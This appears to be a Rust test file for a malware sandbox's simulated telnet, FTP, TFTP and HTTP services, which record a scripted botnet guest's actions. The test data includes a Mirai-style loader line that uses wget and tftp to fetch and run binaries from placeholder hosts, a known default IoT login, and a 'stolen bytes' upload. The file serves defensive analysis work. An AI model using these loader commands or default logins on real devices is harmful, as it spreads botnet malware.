// SPDX-License-Identifier: GPL-3.0-only
//! The built-in services' telnet devices, FTP and TFTP and stand-ins, driven
//! by a scripted guest through the real gateway.
use super::{
    Rig, WAIT,
    guest::{Connect, Guest, Tcp},
    scratch,
};
use crate::route::{
    RouteConfig, RouteKind, TelnetLogins,
    frame::{self, ETHERTYPE_IPV4},
};
use std::{
    net::Ipv4Addr,
    time::{Duration, Instant},
};

const LONG: Duration = Duration::from_secs(15);

fn read_until(tcp: &mut Tcp, guest: &mut Guest, needle: &str, wait: Duration) -> String {
    let deadline = Instant::now() + wait;
    loop {
        let text = String::from_utf8_lossy(&tcp.received).into_owned();
        if text.contains(needle) || tcp.fin || tcp.reset || Instant::now() >= deadline {
            return text;
        }
        tcp.pump(guest, Duration::from_millis(20));
    }
}

fn claim(rig: &Rig, config: &RouteConfig) {
    rig.claim("run1", config, RouteKind::InetSim).unwrap();
}

/// Waits until the log holds what `done` looks for.
fn wait_log(
    rig: &Rig,
    done: impl Fn(&crate::route::InetSimReport) -> bool,
) -> crate::route::InetSimReport {
    let deadline = Instant::now() + WAIT;
    loop {
        let report = rig.gateway.inetsim_report();
        if done(&report) || Instant::now() >= deadline {
            return report;
        }
        std::thread::sleep(Duration::from_millis(20));
    }
}

#[test]
fn a_telnet_device_takes_a_login_answers_the_probe_and_logs_the_loader() {
    let mut rig = Rig::new("inetsim-telnet");
    claim(&rig, &RouteConfig::default());
    let victim = Ipv4Addr::new(203, 0, 113, 7);
    let (mut tcp, state) = Tcp::open(&mut rig.guest, victim, 23, WAIT);
    assert_eq!(state, Connect::Open);
    assert!(read_until(&mut tcp, &mut rig.guest, "login: ", WAIT).contains("login: "));
    tcp.send_all(&mut rig.guest, b"\xff\xfd\x01root\r\n");
    assert!(read_until(&mut tcp, &mut rig.guest, "Password: ", WAIT).contains("Password: "));
    tcp.send_all(&mut rig.guest, b"anything\r\n");
    assert!(read_until(&mut tcp, &mut rig.guest, "# ", WAIT).contains("BusyBox"));
    tcp.send_all(
        &mut rig.guest,
        b"enable\r\nsystem\r\nshell\r\nsh\r\n/bin/busybox ECCHI\r\n",
    );
    assert!(
        read_until(&mut tcp, &mut rig.guest, "ECCHI: applet not found", WAIT)
            .contains("ECCHI: applet not found")
    );
    tcp.send_all(&mut rig.guest, b"cat /proc/cpuinfo; uname -m\r\n");
    assert!(read_until(&mut tcp, &mut rig.guest, "x86_64", WAIT).contains("GenuineIntel"));
    tcp.send_all(
        &mut rig.guest,
        b"cd /tmp; wget http://198.51.100.9/bins/sora.x86 -O s; chmod 777 s; ./s telnet.x86; echo -ne '\\x7fELF' > .d; tftp -g -r t.arm 198.51.100.10\r\n",
    );
    let text = read_until(&mut tcp, &mut rig.guest, "'s' saved", WAIT);
    assert!(text.contains("saving to 's'"), "{text}");
    tcp.send_all(&mut rig.guest, b"exit\r\n");
    tcp.read_to_end(&mut rig.guest, WAIT);
    assert!(tcp.fin);
    let report = wait_log(&rig, |r| {
        r.sessions.first().is_some_and(|s| !s.ended.is_empty())
    });
    let session = &report.sessions[0];
    assert_eq!(session.service, "telnet");
    assert_eq!(session.endpoint, "203.0.113.7:23");
    assert_eq!(session.logins.len(), 1);
    assert_eq!(
        (
            session.logins[0].user.as_str(),
            session.logins[0].password.as_str()
        ),
        ("root", "anything")
    );
    assert!(session.lines.iter().any(|l| l.text == "/bin/busybox ECCHI"));
    assert_eq!(session.downloads.len(), 2);
    assert_eq!(
        session.downloads[0].url,
        "http://198.51.100.9/bins/sora.x86"
    );
    assert_eq!(
        session.downloads[0].served,
        "stand-in served by InetSim: program (x86-64)"
    );
    assert_eq!(session.downloads[1].url, "tftp://198.51.100.10/t.arm");
    assert_eq!(
        session.executed,
        vec!["./s telnet.x86 (stand-in served by InetSim: program (x86-64))".to_owned()]
    );
    assert_eq!(session.written.len(), 1);
    assert_eq!(session.written[0].size, 4);
    assert_eq!(session.ended, "logged out");
    // The log and the echo-written file go into the run's folder.
    let dir = scratch("inetsim-report");
    assert!(rig.gateway.write_inetsim_report(&dir).unwrap());
    let read = crate::route::read_inetsim_report(&dir).unwrap();
    assert_eq!(read, report);
    let kept = std::fs::read(dir.join(&session.written[0].artifact)).unwrap();
    assert_eq!(kept, b"\x7fELF");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn default_logins_refuse_others_and_limits_hang_up() {
    let mut rig = Rig::new("inetsim-limits");
    let mut config = RouteConfig::default();
    config.inetsim.builtin.telnet_logins = TelnetLogins::Defaults;
    config.inetsim.builtin.run_sessions = 2;
    config.inetsim.builtin.session_bytes = 2048;
    claim(&rig, &config);
    let target = Ipv4Addr::new(192, 0, 2, 50);
    let (mut tcp, _) = Tcp::open(&mut rig.guest, target, 2323, WAIT);
    read_until(&mut tcp, &mut rig.guest, "login: ", WAIT);
    tcp.send_all(&mut rig.guest, b"admin\r\nwrong\r\n");
    assert!(
        read_until(&mut tcp, &mut rig.guest, "Login incorrect", WAIT).contains("Login incorrect")
    );
    tcp.send_all(&mut rig.guest, b"root\r\nxc3511\r\n");
    assert!(read_until(&mut tcp, &mut rig.guest, "# ", WAIT).contains("BusyBox"));
    // Over the byte limit the session is hung up.
    let junk = vec![b'A'; 2100];
    tcp.send_all(&mut rig.guest, &junk);
    tcp.read_to_end(&mut rig.guest, WAIT);
    assert!(tcp.fin || tcp.reset);
    // The second session opens; the third is over the run's limit.
    let (mut second, _) = Tcp::open(&mut rig.guest, target, 23, WAIT);
    assert!(read_until(&mut second, &mut rig.guest, "login: ", WAIT).contains("login: "));
    let (mut third, state) = Tcp::open(&mut rig.guest, target, 23, WAIT);
    assert_eq!(state, Connect::Open);
    let text = String::from_utf8_lossy(&third.read_to_end(&mut rig.guest, WAIT)).into_owned();
    assert!(!text.contains("login"), "{text}");
    let report = wait_log(&rig, |r| {
        r.sessions_refused == 1 && r.sessions[0].ended == "byte limit"
    });
    assert_eq!(report.sessions_refused, 1);
    assert_eq!(report.telnet_logins, "defaults");
    let logins = &report.sessions[0].logins;
    assert_eq!(
        logins.iter().map(|l| l.accepted).collect::<Vec<_>>(),
        vec![false, true]
    );
    assert_eq!(report.sessions[0].ended, "byte limit");
}

/// The address and port of a `227 Entering Passive Mode (a,b,c,d,p1,p2)` reply.
fn passive_port(reply: &str) -> u16 {
    let inside = reply.rsplit('(').next().unwrap().split(')').next().unwrap();
    let parts: Vec<u16> = inside
        .split(',')
        .map(|p| p.trim().parse().unwrap())
        .collect();
    parts[4] * 256 + parts[5]
}

#[test]
fn ftp_serves_a_stand_in_and_keeps_an_upload() {
    let mut rig = Rig::new("inetsim-ftp");
    claim(&rig, &RouteConfig::default());
    let server = Ipv4Addr::new(198, 51, 100, 21);
    let (mut control, _) = Tcp::open(&mut rig.guest, server, 21, WAIT);
    read_until(&mut control, &mut rig.guest, "220 ", WAIT);
    control.send_all(
        &mut rig.guest,
        b"USER anonymous\r\nPASS bot@\r\nTYPE I\r\nPASV\r\n",
    );
    let text = read_until(&mut control, &mut rig.guest, "227 ", WAIT);
    let port = passive_port(text.lines().find(|l| l.starts_with("227")).unwrap());
    let (mut data, state) = Tcp::open(&mut rig.guest, server, port, WAIT);
    assert_eq!(state, Connect::Open);
    control.received.clear();
    control.send_all(&mut rig.guest, b"RETR /pub/bot.mips\r\n");
    let body = data.read_to_end(&mut rig.guest, LONG);
    assert!(body.starts_with(b"\x7fELF"), "{body:?}");
    assert!(read_until(&mut control, &mut rig.guest, "226 ", LONG).contains("226 "));
    control.received.clear();
    control.send_all(&mut rig.guest, b"EPSV\r\n");
    let text = read_until(&mut control, &mut rig.guest, "229 ", WAIT);
    let port: u16 = text
        .split("|||")
        .nth(1)
        .unwrap()
        .split('|')
        .next()
        .unwrap()
        .parse()
        .unwrap();
    let (mut data, _) = Tcp::open(&mut rig.guest, server, port, WAIT);
    control.received.clear();
    control.send_all(&mut rig.guest, b"STOR loot.txt\r\n");
    read_until(&mut control, &mut rig.guest, "150 ", LONG);
    data.send_all(&mut rig.guest, b"stolen bytes");
    data.close(&mut rig.guest);
    assert!(read_until(&mut control, &mut rig.guest, "226 ", LONG).contains("226 "));
    control.send_all(&mut rig.guest, b"QUIT\r\n");
    let report = wait_log(&rig, |r| r.transfers.len() == 2);
    assert_eq!(report.sessions[0].service, "ftp");
    assert_eq!(report.sessions[0].logins[0].user, "anonymous");
    let download = &report.transfers[0];
    assert_eq!(
        (download.direction.as_str(), download.url.as_str()),
        ("download", "ftp://198.51.100.21/pub/bot.mips")
    );
    assert_eq!(
        download.served,
        "stand-in served by InetSim: program (x86-64)"
    );
    let upload = &report.transfers[1];
    assert_eq!((upload.direction.as_str(), upload.size), ("upload", 12));
    let dir = scratch("inetsim-ftp-report");
    rig.gateway.write_inetsim_report(&dir).unwrap();
    assert_eq!(
        std::fs::read(dir.join(&upload.artifact)).unwrap(),
        b"stolen bytes"
    );
    let _ = std::fs::remove_dir_all(&dir);
}

/// A UDP datagram to the guest's `port`: its source port and payload.
fn recv_to(guest: &mut Guest, port: u16, wait: Duration) -> Option<(u16, Vec<u8>)> {
    let deadline = Instant::now() + wait;
    while let Some(bytes) = guest.recv(deadline.saturating_duration_since(Instant::now())) {
        let Some(eth) = frame::parse_eth(&bytes).filter(|e| e.ethertype == ETHERTYPE_IPV4) else {
            continue;
        };
        let Some(ip) = frame::parse_ipv4(eth.payload).filter(|ip| ip.protocol == frame::PROTO_UDP)
        else {
            continue;
        };
        if let Some(udp) = frame::parse_udp(ip.payload).filter(|u| u.dst_port == port) {
            return Some((udp.src_port, udp.payload.to_vec()));
        }
    }
    None
}

#[test]
fn tftp_reads_a_stand_in_and_writes_an_upload() {
    let mut rig = Rig::new("inetsim-tftp");
    claim(&rig, &RouteConfig::default());
    let server = Ipv4Addr::new(198, 51, 100, 69);
    // Read: RRQ, DATA 1 (short: the whole file), ACK 1.
    rig.guest
        .send_udp(server, 40_001, 69, b"\x00\x01t.arm7\x00octet\x00");
    let (tid, data) = recv_to(&mut rig.guest, 40_001, WAIT).expect("DATA 1");
    assert_eq!(&data[..4], &[0, 3, 0, 1]);
    assert!(data[4..].starts_with(b"\x7fELF"));
    rig.guest.send_udp(server, 40_001, tid, &[0, 4, 0, 1]);
    // Write with blksize: OACK, DATA 1 (full), DATA 2 (short).
    rig.guest.send_udp(
        server,
        40_002,
        69,
        b"\x00\x02up.bin\x00octet\x00blksize\x0016\x00",
    );
    let (tid, oack) = recv_to(&mut rig.guest, 40_002, WAIT).expect("OACK");
    assert_eq!(oack, b"\x00\x06blksize\x0016\x00");
    let mut block = vec![0, 3, 0, 1];
    block.extend_from_slice(&[b'x'; 16]);
    rig.guest.send_udp(server, 40_002, tid, &block);
    assert_eq!(
        recv_to(&mut rig.guest, 40_002, WAIT).unwrap().1,
        vec![0, 4, 0, 1]
    );
    rig.guest
        .send_udp(server, 40_002, tid, b"\x00\x03\x00\x02end");
    assert_eq!(
        recv_to(&mut rig.guest, 40_002, WAIT).unwrap().1,
        vec![0, 4, 0, 2]
    );
    let report = wait_log(&rig, |r| r.transfers.len() == 2);
    let (read, write) = (&report.transfers[0], &report.transfers[1]);
    assert_eq!(
        (read.protocol.as_str(), read.direction.as_str()),
        ("tftp", "download")
    );
    assert_eq!(read.url, "tftp://198.51.100.69/t.arm7");
    assert!(read.served.contains("program (x86-64)"));
    assert_eq!((write.direction.as_str(), write.size), ("upload", 19));
    assert!(!write.artifact.is_empty());
}

#[test]
fn http_serves_stand_ins_and_the_switch_turns_them_off() {
    for stand_ins in [true, false] {
        let mut rig = Rig::new("inetsim-http");
        let mut config = RouteConfig::default();
        config.inetsim.builtin.stand_ins = stand_ins;
        claim(&rig, &config);
        let (mut tcp, _) = Tcp::open(&mut rig.guest, Ipv4Addr::new(198, 51, 100, 80), 80, WAIT);
        tcp.send_all(
            &mut rig.guest,
            b"GET /bins.sh HTTP/1.1\r\nHost: cnc.example\r\n\r\nGET /bins/x.x86 HTTP/1.1\r\nHost: cnc.example\r\nConnection: close\r\n\r\n",
        );
        let reply = tcp.read_to_end(&mut rig.guest, WAIT);
        let text = String::from_utf8_lossy(&reply).into_owned();
        let report = rig.gateway.inetsim_report();
        if stand_ins {
            assert!(
                text.contains("#!/bin/sh\nexit 0\n") && text.contains("\x7fELF"),
                "{text}"
            );
            assert_eq!(report.transfers.len(), 2);
            assert_eq!(report.transfers[1].url, "http://cnc.example/bins/x.x86");
            assert_eq!(
                report.transfers[0].served,
                "stand-in served by InetSim: script"
            );
        } else {
            assert_eq!(text.matches("Antinomie fake file").count(), 2, "{text}");
            assert!(report.transfers.is_empty());
        }
    }
}
